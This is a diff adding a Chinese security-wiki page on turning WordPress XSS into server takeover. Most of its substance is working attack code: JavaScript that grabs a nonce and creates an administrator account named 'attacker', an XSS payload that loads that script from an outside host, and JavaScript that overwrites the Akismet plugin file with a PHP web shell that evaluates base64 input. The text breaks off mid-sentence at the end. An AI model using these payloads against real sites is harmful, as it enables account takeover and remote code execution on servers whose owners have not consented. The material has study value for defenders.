@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88%E4%BB%8Exss%E5%88%B0getshell%EF%BC%89%20xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>（从xss到getshell） xss的深层次利用与探讨 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\uff08\u4ecexss\u5230getshell\uff09 xss\u7684\u6df1\u5c42\u6b21\u5229\u7528\u4e0e\u63a2\u8ba8", url: "#_top", children: [
+              {title: "\u901a\u8fc7js\u6587\u4ef6\u6dfb\u52a0wp\u7cfb\u7edf\u7ba1\u7406\u5458", url: "#jswp" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../pwnscriptum/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../pwnscriptum/" class="btn btn-xs btn-link">
+        Wordpress 4.6 Remote Code Execution Vulnerability (PwnScriptum)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%EF%BC%88CVE-2020-4046%EF%BC%89WordPress%20%205.3.4%20%E5%82%A8%E5%9E%8BXSS/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%EF%BC%88CVE-2020-4046%EF%BC%89WordPress%20%205.3.4%20%E5%82%A8%E5%9E%8BXSS/" class="btn btn-xs btn-link">
+        （CVE-2020-4046）WordPress 5.3.4 储型XSS
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="xssgetshell-xss">（从xss到getshell） xss的深层次利用与探讨<a class="headerlink" href="#xssgetshell-xss" title="Permanent link">&para;</a></h1>
+<p>今天我们的网站上公布了大量的wp的xss，那么这篇文章就是深入探讨如何深入利用xss。</p>
+<p>如果师傅们有什么新的思路或者姿势。可以通过邮箱联系我们进行讨论与交流</p>
+<p>联系邮箱：ian\@lcx.cc</p>
+<h2 id="jswp">通过js文件添加wp系统管理员<a class="headerlink" href="#jswp" title="Permanent link">&para;</a></h2>
+<h3 id="1">1、创建管理账号<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<p>举个例子，攻击者可以在其Web服务器上托管JavaScript文件，例如wpaddadmin
+[.]
+js（在链接中描述）。此JavaScript代码将添加一个WordPress管理员帐户，其用户名为"
+attacker"，密码为" attacker"。</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="n">Send</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="s1">&#39;/wordpress/wp-admin/user-new.php&#39;</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">extract</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="s1">&#39;nonce&#39;</span><span class="w"> </span><span class="n">value</span><span class="w">  </span>
+<span class="k">var</span><span class="w"> </span><span class="n">ajaxRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">();</span><span class="w">  </span>
+<span class="k">var</span><span class="w"> </span><span class="n">requestURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;/wordpress/wp-admin/user-new.php&quot;</span><span class="p">;</span><span class="w">  </span>
+<span class="k">var</span><span class="w"> </span><span class="n">nonceRegex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">/</span><span class="n">ser</span><span class="s2">&quot; value=&quot;</span><span class="p">([</span><span class="o">^</span><span class="s2">&quot;]*?)&quot;</span><span class="o">/</span><span class="n">g</span><span class="p">;</span><span class="w">  </span>
+<span class="n">ajaxRequest</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">requestURL</span><span class="p">,</span><span class="w"> </span><span class="bp">false</span><span class="p">);</span><span class="w">  </span>
+<span class="n">ajaxRequest</span><span class="o">.</span><span class="n">send</span><span class="p">();</span><span class="w">  </span>
+<span class="k">var</span><span class="w"> </span><span class="n">nonceMatch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nonceRegex</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">ajaxRequest</span><span class="o">.</span><span class="n">responseText</span><span class="p">);</span><span class="w">  </span>
+<span class="k">var</span><span class="w"> </span><span class="n">nonce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nonceMatch</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+<span class="o">//</span><span class="w"> </span><span class="n">Construct</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="n">query</span><span class="p">,</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">previously</span><span class="w"> </span><span class="n">extracted</span><span class="w"> </span><span class="s1">&#39;nonce&#39;</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">arbitrary</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">Administrator</span><span class="w">  </span>
+<span class="k">var</span><span class="w"> </span><span class="n">params</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;action=createuser&amp;_wpnonce_create-user=&quot;</span><span class="o">+</span><span class="n">nonce</span><span class="o">+</span><span class="s2">&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;</span><span class="p">;</span><span class="w">  </span>
+<span class="n">ajaxRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">();</span><span class="w">  </span>
+<span class="n">ajaxRequest</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">requestURL</span><span class="p">,</span><span class="w"> </span><span class="bp">true</span><span class="p">);</span><span class="w">  </span>
+<span class="n">ajaxRequest</span><span class="o">.</span><span class="n">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span><span class="w">  </span>
+<span class="n">ajaxRequest</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">params</span><span class="p">);</span>
+</code></pre></div>
+
+<p>然后，攻击者可以使用以下PoC插入JavaScript。</p>
+<div class="codehilite"><pre><span></span><code><span class="err">“</span><span class="s2">&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;</span><span class="n">javascript</span><span class="o">&amp;</span><span class="n">colon</span><span class="p">;(</span><span class="n">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">var</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;</span><span class="p">;</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">typeof</span><span class="w"> </span><span class="n">beef</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;undefined&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">var</span><span class="w"> </span><span class="n">bf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">document</span><span class="o">.</span><span class="n">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span><span class="w"> </span><span class="n">bf</span><span class="o">.</span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;text/javascript&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">bf</span><span class="o">.</span><span class="n">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">;</span><span class="w"> </span><span class="n">document</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">appendChild</span><span class="p">(</span><span class="n">bf</span><span class="p">);}})();</span><span class="s2">&quot;&amp;gt;”</span>
+</code></pre></div>
+
+<h3 id="1xss">图1.插入XSS代码以添加管理员帐户<a class="headerlink" href="#1xss" title="Permanent link">&para;</a></h3>
+<p><img alt="" src="../resource/%28%E4%BB%8Exss%E5%88%B0getshell%29xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId24.png" /></p>
+<p>具有高权限的受害者查看此帖子后，将创建管理员帐户"攻击者"。</p>
+<h3 id="2-xss">图2. XSS代码被执行<a class="headerlink" href="#2-xss" title="Permanent link">&para;</a></h3>
+<p><img alt="" src="../resource/%28%E4%BB%8Exss%E5%88%B0getshell%29xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId26.png" /></p>
+<h3 id="3-xss">图3. XSS代码创建的具有管理员权限的"攻击者"帐户<a class="headerlink" href="#3-xss" title="Permanent link">&para;</a></h3>
+<p><img alt="" src="../resource/%28%E4%BB%8Exss%E5%88%B0getshell%29xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId28.png" /></p>
+<p>然后，攻击者可以将现有的php文件修改为Webshel​​l，并使用该Webshel​​l来控制Web服务器。</p>
+<p>图4.使用攻击者的帐户添加一个Web Shell</p>
+<p><img alt="" src="../resource/%28%E4%BB%8Exss%E5%88%B0getshell%29xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId29.png" /></p>
+<p>图5.控制Web服务器</p>
+<p><img alt="" src="../resource/%28%E4%BB%8Exss%E5%88%B0getshell%29xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId30.png" /></p>
+<h3 id="2">2、恶意命令执行<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="c1">// Send a GET request to the URL &#39;/wp-admin/plugin-editor.php?akisment/index.php&#39;, and extract the current &#39;nonce&#39; value</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">ajaxRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">requestURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;/wp-admin/plugin-editor.php?file=akismet/index.php&quot;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">nonceRegex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/ce&quot; value=&quot;([^&quot;]*?)&quot;/g</span><span class="p">;</span>
+<span class="nx">ajaxRequest</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">requestURL</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span>
+<span class="nx">ajaxRequest</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">nonceMatch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nonceRegex</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">ajaxRequest</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">nonce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nonceMatch</span><span class="p">[</span><span class="mf">1</span><span class="p">];</span>
+
+<span class="c1">// Construct a POST query, using the previously extracted &#39;nonce&#39; value, and update the content of the file &#39;akismet/index.php&#39; with our tiny web shell</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">params</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;_wpnonce=&quot;</span><span class="o">+</span><span class="nx">nonce</span><span class="o">+</span><span class="err">&quot;</span><span class="o">&amp;</span><span class="nx">newcontent</span><span class="o">=</span><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span><span class="o">&amp;</span><span class="nx">action</span><span class="o">=</span><span class="nx">update</span><span class="o">&amp;</span><span class="nb">file</span><span class="o">=</span><span class="nx">akismet</span><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="s2">&quot;</span>
+<span class="s2">ajaxRequest = new XMLHttpRequest();</span>
+<span class="s2">ajaxRequest.open(&quot;</span><span class="nx">POST</span><span class="s2">&quot;, requestURL, true);</span>
+<span class="s2">ajaxRequest.setRequestHeader(&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="s2">&quot;, &quot;</span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span><span class="s2">&quot;);</span>
+<span class="s2">ajaxRequest.send(params);</span>
+</code></pre></div>
+
+<p>一旦此XSS被管理用户触发，我们应该能够通过向脚本</p>
+<p><a href="http://0-sec.org/wp-content/plugins/akismet/index.php">http://0-sec.org/wp-content/plugins/akismet/index.php</a></p>
+<p>发送GET / POST请求来执行任意PHP代码，其中参数" x"等于我们的PHP代码的"
+base6</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../pwnscriptum/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../pwnscriptum/" class="btn btn-xs btn-link">
+        Wordpress 4.6 Remote Code Execution Vulnerability (PwnScriptum)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%EF%BC%88CVE-2020-4046%EF%BC%89WordPress%20%205.3.4%20%E5%82%A8%E5%9E%8BXSS/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%EF%BC%88CVE-2020-4046%EF%BC%89WordPress%20%205.3.4%20%E5%82%A8%E5%9E%8BXSS/" class="btn btn-xs btn-link">
+        （CVE-2020-4046）WordPress 5.3.4 储型XSS
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
